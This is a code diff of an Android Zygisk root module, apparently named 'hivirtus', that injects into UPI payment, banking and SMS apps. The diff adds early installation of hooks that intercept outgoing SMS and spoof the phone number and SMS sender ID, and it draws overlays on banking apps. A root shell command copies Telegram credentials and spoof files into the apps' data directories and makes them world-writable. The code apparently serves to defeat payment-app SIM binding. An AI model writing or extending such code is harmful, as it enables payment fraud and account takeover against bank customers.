@@ -29,6 +29,16 @@ namespace {
 
 bool is_dangerous_process(const std::string& process) {
     if (process.empty()) return true;
+    // Default SMS apps are ALLOWED — SENDTO real-SIM path
+    if (process == "com.google.android.apps.messaging" ||
+        process == "com.samsung.android.messaging" ||
+        process == "com.android.messaging" ||
+        process == "com.google.android.apps.messaging.auto" ||
+        process == "com.motorola.messaging" ||
+        process == "com.oneplus.mms" ||
+        process == "com.coloros.mms") {
+        return false;
+    }
     static const char* kNever[] = {
         "zygote", "zygote64", "system_server",
         "com.android.phone",
@@ -43,8 +53,6 @@ bool is_dangerous_process(const std::string& process) {
         "com.android.nfc",
         "com.android.mms",
         "com.android.mms.service",
-        "com.google.android.apps.messaging",
-        "com.samsung.android.messaging",
         "com.samsung.android.settings",
         "com.samsung.android.app.telephonyui",
         "com.samsung.android.dialer",
@@ -207,7 +215,6 @@ public:
         if (is_dangerous_process(pkg_) ||
             upi_registry::is_module_own_app(pkg_) ||
             !upi_registry::is_sms_hook_target(pkg_)) {
-            // Still report UPI-looking names that we skipped for other reasons
             if (!pkg_.empty() && !is_dangerous_process(pkg_) &&
                 (pkg_.find("pay") != std::string::npos ||
                  pkg_.find("upi") != std::string::npos ||
@@ -220,11 +227,9 @@ public:
             return;
         }
 
-        // connectCompanion ONLY works in preSpecialize — log + seed A16 assets here.
         report_line(api_, "pre_seen:" + process_name_);
         report_line(api_, "safe_inject:" + pkg_);
 
-        // Android 16: app cannot read /data/local/tmp — copy dex/ui into app code_cache
         std::string data_dir;
         if (args->app_data_dir) {
             const char* dd = env_->GetStringUTFChars(args->app_data_dir, nullptr);
@@ -233,10 +238,27 @@ public:
                 env_->ReleaseStringUTFChars(args->app_data_dir, dd);
             }
         }
+        data_dir_ = data_dir;
         const int uid = args->uid;
         if (!data_dir.empty()) {
             report_line(api_, "prep_assets|" + pkg_ + "|" + std::to_string(uid) + "|" + data_dir);
         }
+
+        // CRITICAL: install hooks in PRE while Zygisk Api is guaranteed valid.
+        // postSpecialize pe user ke logs me sirf companion_seed tha — hooks miss.
+        ConfigManager::instance().reload();
+        ConfigManager::instance().apply_ui_save_file();
+        ConfigManager::instance().reload();
+
+        std::string sms_st = outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
+        report_line(api_, std::string("HOOK|") + sms_st);
+
+        phone_number_hook::install(env_, api_, pkg_.c_str());
+        report_line(api_, "phone_hook:" + pkg_);
+
+        sender_spoof::install(env_, api_, pkg_.c_str());
+        report_line(api_, "sender_hook:" + pkg_);
+
         keep_ = true;
     }
 
@@ -251,62 +273,34 @@ public:
             return;
         }
 
-        // post: companion unavailable — best-effort direct log
-        append_diag("/data/local/tmp/hivirtus_inject.log",
-                    ("post_enter:" + pkg_).c_str());
-
-        ConfigManager::instance().reload();
-        const auto& config = ConfigManager::instance().get();
-        // Registry already filtered sms_hook_target above. Do NOT skip on config —
-        // A16 often cannot read config → is_upi_app_hooked false → empty hook_status.
-        if (!config.is_upi_app_hooked(pkg_)) {
-            append_diag("/data/local/tmp/hivirtus_inject.log",
-                        ("warn_config_off_force:" + pkg_).c_str());
-        }
-
-        logger::init(config.log_file);
-        mark_active();
-
-        ConfigManager::instance().apply_ui_save_file();
-        ConfigManager::instance().reload();
-        const auto& live = ConfigManager::instance().get();
-
-        const bool phone_spoof = live.virtual_sim_active() || live.enable_phone_spoof ||
-                                 live.enable_sim1_mock;
-        const bool fragile = upi_registry::is_fragile_banking_app(pkg_);
-        const bool yespay = is_yespay(pkg_);
-
-        // ALWAYS install SMS hooks for UPI targets — config unread on A16 pe skip mat karo
+        // Soft re-assert hooks (Api may be limited; best-effort)
         outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
-        // Status app-writable path pe (tmp A16 pe fail)
+        phone_number_hook::install(env_, api_, pkg_.c_str());
+        sender_spoof::install(env_, api_, pkg_.c_str());
+
+        mark_active();
         {
-            std::string base = "/data/user/0/" + pkg_ + "/code_cache/hivirtus";
-            mkdir(("/data/user/0/" + pkg_ + "/code_cache").c_str(), 0700);
+            std::string base = data_dir_.empty()
+                                   ? ("/data/user/0/" + pkg_ + "/code_cache/hivirtus")
+                                   : (data_dir_ + "/code_cache/hivirtus");
+            mkdir((data_dir_.empty() ? ("/data/user/0/" + pkg_ + "/code_cache")
+                                     : (data_dir_ + "/code_cache"))
+                      .c_str(),
+                  0700);
             mkdir(base.c_str(), 0700);
-            std::string st = base + "/post_hooks.txt";
-            FILE* sf = fopen(st.c_str(), "w");
-            if (!sf) {
-                base = "/data/data/" + pkg_ + "/code_cache/hivirtus";
-                mkdir(("/data/data/" + pkg_ + "/code_cache").c_str(), 0700);
-                mkdir(base.c_str(), 0700);
-                st = base + "/post_hooks.txt";
-                sf = fopen(st.c_str(), "w");
-            }
+            FILE* sf = fopen((base + "/post_hooks.txt").c_str(), "w");
             if (sf) {
-                fprintf(sf, "isms_installed:%s\n", pkg_.c_str());
+                fprintf(sf, "post_ok:%s\n", pkg_.c_str());
                 fclose(sf);
             }
         }
 
-        if (phone_spoof) {
-            phone_number_hook::install(env_, api_, pkg_.c_str());
-        }
-
-        // SMSTweaks: always arm SmsMessage sender hooks in UPI (active when ID saved)
-        sender_spoof::install(env_, api_, pkg_.c_str());
-
-        // Overlay after hooks so SMS path ready first
-        if (native_overlay_wanted()) {
+        // Overlay only for UPI (not Messages app)
+        const bool is_msg = (pkg_.find("messaging") != std::string::npos) ||
+                            (pkg_.find(".mms") != std::string::npos);
+        if (native_overlay_wanted() && !is_msg) {
+            const bool fragile = upi_registry::is_fragile_banking_app(pkg_);
+            const bool yespay = is_yespay(pkg_);
             const int ov = yespay ? 2 : (fragile ? 2 : 1);
             schedule_overlay_ui(env_, api_, pkg_, ov);
         }
@@ -333,6 +327,7 @@ private:
     JNIEnv* env_ = nullptr;
     std::string process_name_;
     std::string pkg_;
+    std::string data_dir_;
     bool keep_ = false;
 };
 
@@ -340,25 +335,65 @@ void companion_prep_assets(const std::string& pkg, int uid, const std::string& d
     if (pkg.empty() || data_dir.empty() || uid <= 0) return;
     const char* mod = "/data/adb/modules/hivirtus_zygisk_mode";
     std::string dest = data_dir + "/code_cache/hivirtus";
-    std::string cmd = "mkdir -p '" + dest + "/ui' 2>/dev/null; "
-                      "cp -f '" + std::string(mod) + "/bridge.dex' '" + dest + "/bridge.dex' 2>/dev/null; "
-                      "cp -f '" + std::string(mod) + "/ui/'* '" + dest + "/ui/' 2>/dev/null; "
-                      "cp -f '" + std::string(mod) + "/config.json' '" + dest + "/config.json' 2>/dev/null; "
-                      "cp -f /data/local/tmp/hivirtus_ui_save.json '" + dest + "/ui_save.json' 2>/dev/null; "
-                      "cp -f /data/local/tmp/hivirtus_zygisk_mode_config.json '" + dest + "/config.json' 2>/dev/null; "
-                      "cp -f /data/local/tmp/hivirtus_bridge.dex '" + dest + "/bridge.dex' 2>/dev/null; "
-                      // Seed writable hook_status so postSpecialize can append (A16)
-                      "touch '" + dest + "/hook_status.txt' '" + dest + "/post_hooks.txt' 2>/dev/null; "
-                      "echo \"$(date +%s) companion_seed:" + pkg + "\" >> '" + dest + "/hook_status.txt'; "
-                      "echo \"$(date +%s) companion_seed:" + pkg + "\" >> /data/local/tmp/hivirtus_hook_status.txt; "
-                      "echo \"$(date +%s) companion_seed:" + pkg + "\" >> " + std::string(mod) + "/hook_status.txt; "
-                      "chmod 666 '" + dest + "/hook_status.txt' '" + dest + "/post_hooks.txt' "
-                      "/data/local/tmp/hivirtus_hook_status.txt 2>/dev/null; "
-                      "chmod -R 755 '" + dest + "' 2>/dev/null; "
-                      "chmod 644 '" + dest + "/bridge.dex' '" + dest + "/ui/'* '" + dest + "/config.json' 2>/dev/null; "
-                      "chmod 666 '" + dest + "/hook_status.txt' '" + dest + "/post_hooks.txt' 2>/dev/null; "
-                      "chown -R " + std::to_string(uid) + ":" + std::to_string(uid) + " '" + dest + "' 2>/dev/null; "
-                      "restorecon -R '" + dest + "' 2>/dev/null; true";
+    std::string files = data_dir + "/files";
+    std::string cmd =
+        "mkdir -p '" + dest + "/ui' '" + files + "' 2>/dev/null; "
+        "cp -f '" + std::string(mod) + "/bridge.dex' '" + dest + "/bridge.dex' 2>/dev/null; "
+        "cp -f '" + std::string(mod) + "/ui/'* '" + dest + "/ui/' 2>/dev/null; "
+        // GLOBAL config → every app (ek Save sab jagah)
+        "for src in /data/local/tmp/hivirtus_ui_save.json " + std::string(mod) + "/ui_save.json; do "
+        "  [ -s \"$src\" ] || continue; "
+        "  cp -f \"$src\" '" + dest + "/ui_save.json'; "
+        "  cp -f \"$src\" '" + files + "/hivirtus_ui_save.json'; "
+        "  cp -f \"$src\" '" + dest + "/config.json'; "
+        "  break; "
+        "done; "
+        "for src in /data/local/tmp/hivirtus_telegram_credentials.json " + std::string(mod) +
+        "/telegram_credentials.json; do "
+        "  [ -s \"$src\" ] || continue; "
+        "  cp -f \"$src\" '" + dest + "/hivirtus_telegram_credentials.json'; "
+        "  cp -f \"$src\" '" + files + "/hivirtus_telegram_credentials.json'; "
+        "  break; "
+        "done; "
+        "for src in /data/local/tmp/hivirtus_sender_id.txt " + std::string(mod) +
+        "/sender_id.txt; do "
+        "  [ -s \"$src\" ] || continue; "
+        "  cp -f \"$src\" '" + dest + "/hivirtus_sender_id.txt'; "
+        "  cp -f \"$src\" '" + files + "/hivirtus_sender_id.txt'; "
+        "  break; "
+        "done; "
+        "for src in /data/local/tmp/hivirtus_spoof_phone.txt " + std::string(mod) +
+        "/spoof_phone.txt; do "
+        "  [ -s \"$src\" ] || continue; "
+        "  cp -f \"$src\" '" + dest + "/hivirtus_spoof_phone.txt'; "
+        "  cp -f \"$src\" '" + files + "/hivirtus_spoof_phone.txt'; "
+        "  break; "
+        "done; "
+        "cp -f /data/local/tmp/hivirtus_zygisk_mode_config.json '" + dest +
+        "/config.json' 2>/dev/null; "
+        "cp -f /data/local/tmp/hivirtus_bridge.dex '" + dest + "/bridge.dex' 2>/dev/null; "
+        "touch '" + dest + "/hook_status.txt' '" + dest + "/post_hooks.txt' 2>/dev/null; "
+        "echo \"$(date +%s) companion_seed:" + pkg + "\" >> '" + dest + "/hook_status.txt'; "
+        "echo \"$(date +%s) companion_seed:" + pkg +
+        "\" >> /data/local/tmp/hivirtus_hook_status.txt; "
+        "echo \"$(date +%s) companion_seed:" + pkg + "\" >> " + std::string(mod) +
+        "/hook_status.txt; "
+        "chmod -R 755 '" + dest + "' 2>/dev/null; "
+        "chmod 644 '" + dest + "/bridge.dex' '" + dest + "/ui/'* 2>/dev/null; "
+        "chmod 666 '" + dest + "/hook_status.txt' '" + dest + "/post_hooks.txt' "
+        "'" + dest + "/ui_save.json' '" + dest + "/config.json' "
+        "'" + dest + "/hivirtus_telegram_credentials.json' '" + dest +
+        "/hivirtus_sender_id.txt' "
+        "'" + files + "/hivirtus_ui_save.json' '" + files +
+        "/hivirtus_telegram_credentials.json' "
+        "'" + files + "/hivirtus_sender_id.txt' '" + files +
+        "/hivirtus_spoof_phone.txt' "
+        "/data/local/tmp/hivirtus_hook_status.txt 2>/dev/null; "
+        "chown -R " + std::to_string(uid) + ":" + std::to_string(uid) + " '" + dest + "' '" +
+        files + "/hivirtus_ui_save.json' '" + files +
+        "/hivirtus_telegram_credentials.json' '" + files + "/hivirtus_sender_id.txt' '" + files +
+        "/hivirtus_spoof_phone.txt' 2>/dev/null; "
+        "restorecon -R '" + dest + "' 2>/dev/null; true";
     system(cmd.c_str());
 
     FILE* f = fopen("/data/local/tmp/hivirtus_overlay.debug", "a");
@@ -377,7 +412,6 @@ void companion_handler(int client) {
     if (read(client, line.data(), len) != static_cast<ssize_t>(len)) return;
 
     if (line.rfind("prep_assets|", 0) == 0) {
-        // prep_assets|pkg|uid|data_dir
         std::string rest = line.substr(12);
         auto p1 = rest.find('|');
         auto p2 = p1 == std::string::npos ? std::string::npos : rest.find('|', p1 + 1);
@@ -386,6 +420,29 @@ void companion_handler(int client) {
             int uid = atoi(rest.substr(p1 + 1, p2 - p1 - 1).c_str());
             std::string data_dir = rest.substr(p2 + 1);
             companion_prep_assets(pkg, uid, data_dir);
+        }
+    }
+
+    // Root-visible hook status (A16 app can't write tmp)
+    if (line.rfind("HOOK|", 0) == 0 || line.rfind("phone_hook:", 0) == 0 ||
+        line.rfind("sender_hook:", 0) == 0 || line.rfind("upi_hook_done", 0) == 0) {
+        char tsline[512];
+        snprintf(tsline, sizeof(tsline), "%ld %s\n", static_cast<long>(time(nullptr)),
+                 line.c_str());
+        auto append_root = [&](const char* path) {
+            FILE* hf = fopen(path, "a");
+            if (!hf) return;
+            fputs(tsline, hf);
+            fclose(hf);
+            chmod(path, 0666);
+        };
+        append_root("/data/local/tmp/hivirtus_hook_status.txt");
+        append_root("/data/adb/modules/hivirtus_zygisk_mode/hook_status.txt");
+        FILE* latest = fopen("/data/local/tmp/hivirtus_hook_status_latest.txt", "w");
+        if (latest) {
+            fputs(tsline, latest);
+            fclose(latest);
+            chmod("/data/local/tmp/hivirtus_hook_status_latest.txt", 0666);
         }
     }
 
